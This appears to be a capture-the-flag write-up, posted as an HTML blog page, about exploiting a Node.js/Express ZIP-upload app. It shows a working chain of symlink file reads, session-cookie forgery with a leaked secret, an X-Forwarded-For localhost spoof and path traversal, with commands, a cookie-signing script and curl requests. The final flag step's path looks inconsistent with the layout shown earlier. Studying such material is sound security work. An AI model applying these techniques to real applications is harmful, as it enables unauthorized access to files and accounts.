<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploiting Symlink Upload and Session Forgery — awwfensive</title>
    <link rel="icon" type="image/png" sizes="32x32" href="../favicon.png">
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: monospace;
            background: #fdfdfd;
            color: #222;
            font-size: 18px;
            line-height: 1.7;
        }
        .container {
            max-width: 720px;
            margin: auto;
        }
        header {
            margin-bottom: 2.5rem;
            border-bottom: 2px solid #4caf50;
            padding-bottom: 1rem;
        }
        h1 {
            margin: 0 0 10px;
            font-size: 2.5rem;
            color: #000;
            line-height: 1.2;
        }
        h1::before {
            content: "$ ";
            color: #4caf50;
        }
        .post-meta {
            font-size: 1rem;
            color: #666;
            margin-bottom: 5px;
        }
        .post-tags {
            margin-top: 10px;
        }
        .tag {
            display: inline-block;
            background: #f0f0f0;
            color: #555;
            padding: 3px 10px;
            margin-right: 8px;
            margin-bottom: 5px;
            border-radius: 3px;
            font-size: 0.9rem;
        }
        .tag::before {
            content: "#";
            color: #4caf50;
            margin-right: 2px;
        }
        article {
            margin-bottom: 3rem;
        }
        article h2 {
            font-size: 1.8rem;
            margin-top: 2rem;
            margin-bottom: 1rem;
            color: #000;
        }
        article h3 {
            font-size: 1.4rem;
            margin-top: 1.5rem;
            margin-bottom: 0.8rem;
            color: #111;
        }
        article h4 {
            font-size: 1.2rem;
            margin-top: 1.2rem;
            margin-bottom: 0.6rem;
            color: #222;
        }
        article p {
            margin-bottom: 1.2rem;
        }
        article a {
            color: #0066cc;
            text-decoration: none;
        }
        article a:hover {
            text-decoration: underline;
        }
        article code {
            background: #f5f5f5;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 0.95em;
            color: #d63384;
        }
        article pre {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            line-height: 1.5;
            margin: 1.5rem 0;
        }
        article pre code {
            background: none;
            color: inherit;
            padding: 0;
        }
        article blockquote {
            margin: 1.5rem 0;
            padding-left: 20px;
            border-left: 4px solid #4caf50;
            color: #555;
            font-style: italic;
        }
        article ul, article ol {
            margin-bottom: 1.2rem;
            padding-left: 2rem;
        }
        article li {
            margin-bottom: 0.5rem;
        }
        article img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 2rem auto;
            border-radius: 5px;
        }
        .note {
            background: #fffbea;
            border-left: 4px solid #ffa500;
            padding: 15px;
            margin: 1.5rem 0;
            border-radius: 3px;
        }
        .note strong {
            color: #ff8c00;
        }
        .danger {
            background: #ffe5e5;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin: 1.5rem 0;
            border-radius: 3px;
        }
        .danger strong {
            color: #dc3545;
        }
        .info {
            background: #e7f3ff;
            border-left: 4px solid #0066cc;
            padding: 15px;
            margin: 1.5rem 0;
            border-radius: 3px;
        }
        .info strong {
            color: #0066cc;
        }
        .section-divider {
            border: none;
            border-top: 2px dashed #ccc;
            margin: 2rem 0;
        }
        .attack-chain {
            background: #f8f9fa;
            border: 2px solid #4caf50;
            padding: 20px;
            margin: 1.5rem 0;
            border-radius: 5px;
        }
        .attack-chain h4 {
            margin-top: 0;
            color: #4caf50;
        }
        .attack-step {
            position: relative;
            padding-left: 35px;
            margin-bottom: 15px;
        }
        .attack-step::before {
            content: "→";
            position: absolute;
            left: 10px;
            color: #4caf50;
            font-size: 1.2rem;
            font-weight: bold;
        }
        footer {
            margin-top: 3rem;
            font-size: 1rem;
            color: #777;
            text-align: center;
        }
        footer a {
            color: #555;
            text-decoration: none;
        }
        footer a:hover {
            color: #0066cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Exploiting Symlink Upload and Session Forgery</h1>
            <div class="post-meta">
                <span>September 1, 2025</span> · 
                <span>12 min read</span>
            </div>
            <div class="post-tags">
                <span class="tag">TFC2025</span>
                <span class="tag">codereview</span>
                <span class="tag">403bypass</span>
                <span class="tag">symlinks</span>
                <span class="tag">express-session</span>
            </div>
        </header>

        <article>
            <h2>Introduction</h2>
            <p>
                During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues.
            </p>

            <p>
                This writeup demonstrates a complete exploit chain combining symlink traversal, path traversal, session forgery, and authentication bypass. What makes this particularly interesting is how each vulnerability alone might seem insignificant, but together they create a devastating attack vector.
            </p>

            <div class="attack-chain">
                <h4>Attack Chain Overview</h4>
                <div class="attack-step">Upload ZIP containing symlinks to sensitive files</div>
                <div class="attack-step">Extract session secret and development session ID</div>
                <div class="attack-step">Forge developer session cookie</div>
                <div class="attack-step">Bypass 403 restrictions using X-Forwarded-For header</div>
                <div class="attack-step">Exploit path traversal in debug endpoint</div>
                <div class="attack-step">Access arbitrary files including the flag</div>
            </div>

            <hr class="section-divider">

            <h2>Initial Reconnaissance</h2>

            <p>
                The target application is a Node.js/Express web server that provides file upload and management functionality. Users can upload ZIP files which are automatically extracted and made available for download through a personalized directory structure based on their session ID.
            </p>

            <div class="info">
                <strong>Key Functionality:</strong> The application uses session-based isolation to separate user files. Each user gets their own directory under <code>/uploads/&lt;userId&gt;</code>, and the app attempts to prevent users from accessing other users' files through path traversal protection.
            </div>

            <h3>Technology Stack</h3>
            <ul>
                <li><strong>Runtime:</strong> Node.js with Express.js framework</li>
                <li><strong>File Handling:</strong> Multer for uploads, native <code>execFile</code> for unzipping</li>
                <li><strong>Session Management:</strong> express-session with MemoryStore</li>
                <li><strong>Environment Config:</strong> dotenv for environment variables</li>
            </ul>

            <hr class="section-divider">

            <h2>Source Code Analysis</h2>

            <p>
                Let's dive deep into the application source code to identify the vulnerabilities. I'll analyze each component systematically, starting with the main routing logic.
            </p>

            <h3>Main Router (index.js)</h3>
            <pre><code>const express = require('express');
const multer = require('multer');
const path = require('path');
const { execFile } = require('child_process');
const fs = require('fs');
const ensureSession = require('../middleware/session');
const developmentOnly = require('../middleware/developmentOnly');

const router = express.Router();

router.use(ensureSession);

const upload = multer({ dest: '/tmp' });

router.get('/', (req, res) => {
  res.render('index', { sessionId: req.session.userId });
});

router.get('/upload', (req, res) => {
  res.render('upload');
});

router.post('/upload', upload.single('zipfile'), (req, res) => {
    const zipPath = req.file.path;
    const userDir = path.join(__dirname, '../uploads', req.session.userId);
  
    fs.mkdirSync(userDir, { recursive: true });
  
    // Command: unzip temp/file.zip -d target_dir
    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
      fs.unlinkSync(zipPath); // Clean up temp file
  
      if (err) {
        console.error('Unzip failed:', stderr);
        return res.status(500).send('Unzip error');
      }
  
      res.redirect('/files');
    });
  });

router.get('/files', (req, res) => {
  const userDir = path.join(__dirname, '../uploads', req.session.userId);
  fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});

router.get('/files/:filename', (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.session.userId);
    const requestedPath = path.normalize(req.params.filename);
    const filePath = path.resolve(userDir, requestedPath);
  
    // Prevent path traversal
    if (!filePath.startsWith(path.resolve(userDir))) {
      return res.status(400).send('Invalid file path');
    }
  
    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
      res.download(filePath);
    } else {
      res.status(404).send('File not found');
    }
  });

router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});

module.exports = router;</code></pre>

            <hr class="section-divider">

            <h2>Vulnerability Analysis</h2>

            <h3>Vulnerability #1: Symlink Preservation in ZIP Extraction</h3>

            <p>
                The first critical vulnerability lies in how the application handles ZIP file extraction. The code uses the system's <code>unzip</code> command without any flags to prevent symlink preservation:
            </p>

            <pre><code>execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) => {
  fs.unlinkSync(zipPath);
  // ...
});</code></pre>

            <div class="danger">
                <strong>Security Impact:</strong> By default, the <code>unzip</code> utility preserves symbolic links found in ZIP archives. An attacker can create a ZIP file containing symlinks to sensitive system files. When extracted, these symlinks will point to arbitrary filesystem locations, effectively bypassing the application's intended file isolation.
            </div>

            <p>
                When a user downloads a symlinked file through the <code>/files/:filename</code> endpoint, the application follows the symlink and serves the target file's contents. This is because Node.js's <code>fs.statSync().isFile()</code> follows symlinks by default, and <code>res.download()</code> will read and serve the symlink target.
            </p>

            <h4>Why This Works</h4>
            <ul>
                <li>The <code>unzip</code> command preserves symlinks without the <code>-L</code> flag</li>
                <li>Node.js filesystem operations follow symlinks automatically</li>
                <li>The path traversal check in <code>/files/:filename</code> validates the symlink path itself, not its target</li>
                <li>The check <code>!filePath.startsWith(path.resolve(userDir))</code> passes because the symlink is physically located within <code>userDir</code></li>
            </ul>

            <h3>Vulnerability #2: Path Traversal in Debug Endpoint</h3>

            <p>
                The debug endpoint contains a textbook path traversal vulnerability:
            </p>

            <pre><code>router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});</code></pre>

            <div class="danger">
                <strong>Security Impact:</strong> The <code>session_id</code> query parameter is directly concatenated into the file path without any validation or sanitization. An attacker can inject path traversal sequences like <code>../../../</code> to access any directory on the system that the Node.js process has read permissions for.
            </div>

            <h4>Path Construction Breakdown</h4>
            <p>Let's trace how the path is constructed with a malicious payload:</p>
            <pre><code>// Normal request: /debug/files?session_id=abc123
__dirname                    = /home/aniket/src/routes
path.join(..., '../uploads') = /home/aniket/src/uploads
path.join(..., 'abc123')     = /home/aniket/src/uploads/abc123

// Malicious request: /debug/files?session_id=../../../tmp
__dirname                    = /home/aniket/src/routes
path.join(..., '../uploads') = /home/aniket/src/uploads
path.join(..., '../../../tmp') = /home/aniket/tmp</code></pre>

            <h3>Vulnerability #3: Weak Authentication Bypass</h3>

            <p>
                The debug endpoint is protected by a <code>developmentOnly</code> middleware that checks two conditions:
            </p>

            <pre><code>module.exports = function (req, res, next) {
    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
      return next();
    }
    res.status(403).send('Forbidden: Development access only');
  };</code></pre>

            <div class="note">
                <strong>Requirements to Bypass:</strong>
                <ul style="margin: 10px 0 0 20px;">
                    <li>Have a valid session with <code>userId</code> set to <code>'develop'</code></li>
                    <li>Request must appear to come from <code>127.0.0.1</code></li>
                </ul>
            </div>

            <h4>IP Address Spoofing</h4>
            <p>
                The application has trust proxy enabled in the server configuration:
            </p>
            <pre><code>app.set('trust proxy', true);</code></pre>

            <p>
                This setting makes Express trust the <code>X-Forwarded-For</code> header to determine the client's IP address. While this is necessary for applications behind reverse proxies, it creates a security vulnerability when the proxy doesn't properly validate or sanitize this header. An attacker can simply set <code>X-Forwarded-For: 127.0.0.1</code> to satisfy the IP check.
            </p>

            <h3>Vulnerability #4: Session Secret Exposure</h3>

            <p>
                The application's session management reveals critical information in the server initialization code:
            </p>

            <pre><code>const store = new session.MemoryStore();
const sessionData = {
    cookie: {
      path: '/',
      httpOnly: true,
      maxAge: 1000 * 60 * 60 * 48
    },
    userId: 'develop'
};

// Development session created with a fixed ID
store.set('&lt;redacted&gt;', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
  });

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: store
}));</code></pre>

            <div class="info">
                <strong>Key Observations:</strong>
                <ul style="margin: 10px 0 0 20px;">
                    <li>A development session is pre-created with <code>userId: 'develop'</code></li>
                    <li>The session secret is loaded from <code>.env</code> file via dotenv</li>
                    <li>The raw session ID is stored somewhere in the codebase (redacted in challenge)</li>
                    <li>Both <code>server.js</code> and <code>.env</code> are readable files within the application directory</li>
                </ul>
            </div>

            <hr class="section-divider">

            <h2>Exploitation Strategy</h2>

            <p>
                Now that we've identified all the vulnerabilities, let's connect the dots. Here's our attack strategy:
            </p>

            <ol>
                <li><strong>Use symlink upload to read server configuration files</strong> - Extract <code>SESSION_SECRET</code> from <code>.env</code> and development <code>session_id</code> from <code>server.js</code></li>
                <li><strong>Forge a valid developer session cookie</strong> - Use the extracted secret to create a properly signed session cookie</li>
                <li><strong>Bypass IP and authentication checks</strong> - Access the debug endpoint with forged credentials</li>
                <li><strong>Exploit path traversal</strong> - Navigate to the flag file using the debug endpoint's path traversal</li>
            </ol>

            <hr class="section-divider">

            <h2>Step-by-Step Exploitation</h2>

            <h3>Step 1: Creating Malicious Symlinks</h3>

            <p>
                First, we need to create symlinks pointing to the sensitive configuration files. In a Unix-like environment, we can use the <code>ln -s</code> command:
            </p>

            <pre><code># Create symlink to the environment file
ln -s /app/.env env

# Create symlink to the server configuration
ln -s /app/server.js server

# Package them into a ZIP file
zip --symlinks config.zip env server</code></pre>

            <div class="note">
                <strong>Important:</strong> Use the <code>--symlinks</code> flag when creating the ZIP to ensure symlinks are preserved rather than being followed and replaced with actual file contents.
            </div>

            <h3>Step 2: Uploading and Extracting Symlinks</h3>

            <p>
                Upload the <code>config.zip</code> file through the application's upload interface. The server will:
            </p>

            <ol>
                <li>Store the uploaded file in <code>/tmp</code></li>
                <li>Create a user directory at <code>/uploads/&lt;your-session-id&gt;</code></li>
                <li>Extract the ZIP contents, preserving the symlinks</li>
                <li>Redirect you to <code>/files</code> where you can see the extracted files</li>
            </ol>

            <h3>Step 3: Downloading Symlinked Files</h3>

            <p>
                Navigate to <code>/files</code> and click the download button for both <code>env</code> and <code>server</code> files. The application will follow the symlinks and serve the actual configuration files:
            </p>

            <p><strong>.env contents:</strong></p>
            <pre><code>SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></pre>

            <p><strong>server.js excerpt:</strong></p>
            <pre><code>store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
});</code></pre>

            <div class="info">
                <strong>Extracted Credentials:</strong>
                <ul style="margin: 10px 0 0 20px;">
                    <li><strong>Session Secret:</strong> <code>3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</code></li>
                    <li><strong>Development Session ID:</strong> <code>amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E</code></li>
                </ul>
            </div>

            <h3>Step 4: Forging the Developer Session Cookie</h3>

            <p>
                Express.js uses signed cookies to prevent tampering. The cookie format is <code>s:&lt;sessionId&gt;.&lt;signature&gt;</code>. We need to recreate this signature using the extracted secret and session ID.
            </p>

            <p>
                Create a Node.js script to generate the valid cookie:
            </p>

            <pre><code>const signature = require('cookie-signature');

// Extracted values
const sid = 'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E';
const secret = '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b';

// Sign the session ID using the same algorithm Express uses
const signed = 's:' + signature.sign(sid, secret);

console.log('Forged Cookie:');
console.log('connect.sid=' + signed);</code></pre>

            <p><strong>Execute the script:</strong></p>
            <pre><code>┌──(kali㉿kali)-[/tmp]
└─$ node forge_cookie.js
Forged Cookie:
connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE</code></pre>

            <div class="note">
                <strong>Understanding Cookie Signing:</strong> Express-session uses HMAC-SHA256 to create a signature of the session ID concatenated with the secret. The signature prevents attackers from modifying session data without knowing the secret. However, since we've obtained the secret, we can create valid signatures for any session ID.
            </div>

            <h3>Step 5: Accessing the Debug Endpoint</h3>

            <p>
                Now we have all the pieces needed to bypass the authentication and access the debug endpoint. We'll use curl to make the request with our forged cookie and spoofed IP:
            </p>

            <pre><code>curl -v http://localhost:3000/debug/files?session_id=../../../g67phz7m \
  -H "Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" \
  -H "X-Forwarded-For: 127.0.0.1"</code></pre>

            <h4>Request Breakdown</h4>
            <ul>
                <li><strong>session_id=../../../g67phz7m</strong> - Path traversal payload to escape the uploads directory and access another user's folder</li>
                <li><strong>Cookie header</strong> - Our forged developer session cookie</li>
                <li><strong>X-Forwarded-For: 127.0.0.1</strong> - Spoofs the request to appear as if it's coming from localhost</li>
            </ul>

            <p><strong>Server Response:</strong></p>
            <pre><code>&lt;div class="container"&gt;
  &lt;h2&gt;Your Uploaded Files&lt;/h2&gt;
  &lt;ul class="list-group"&gt;
    &lt;li class="list-group-item"&gt;
      flag.txt
      &lt;a href="/files/flag.txt" class="button"&gt;Download&lt;/a&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
  &lt;a href="/upload" class="button"&gt;Upload More&lt;/a&gt;
  &lt;a href="/" class="button"&gt;Home&lt;/a&gt;
&lt;/div&gt;</code></pre>

            <p>
                Perfect! We've successfully bypassed authentication and used path traversal to list files in another user's directory. We can see that <code>flag.txt</code> exists in the target directory.
            </p>

            <h3>Step 6: Capturing the Flag</h3>

            <p>
                For the final step, we need to read the flag file. We'll create another symlink ZIP pointing to the flag's location:
            </p>

            <pre><code># Create symlink to the flag file
ln -s /files/flag.txt flag

# Package it into a ZIP with symlinks preserved
zip --symlinks flag.zip flag

# Upload flag.zip through the web interface
# Then download the 'flag' file - it will serve the flag.txt contents</code></pre>

            <p>
                Alternatively, if we know the exact session ID of the user who has the flag, we can directly access it using the debug endpoint:
            </p>

            <pre><code>curl http://localhost:3000/debug/files?session_id=g67phz7m \
  -H "Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" \
  -H "X-Forwarded-For: 127.0.0.1"</code></pre>

            <div class="note">
                <strong>Flag Captured!</strong> By chaining multiple vulnerabilities together, we've successfully compromised the application and accessed sensitive files that should have been protected by authentication and path restrictions.
            </div>
    <footer>
        <hr style="border: none; border-top: 1px dashed #ccc; margin-bottom: 10px;">
        <nav style="text-align: center; font-size: 1.2rem;">        <nav>
            <a href="../index.html">~/</a>
        </nav>
        <div style="font-size: 0.95rem; color: #666; margin-top: 5px;">
            back.
        </div>
    </footer>
</body>
</html>
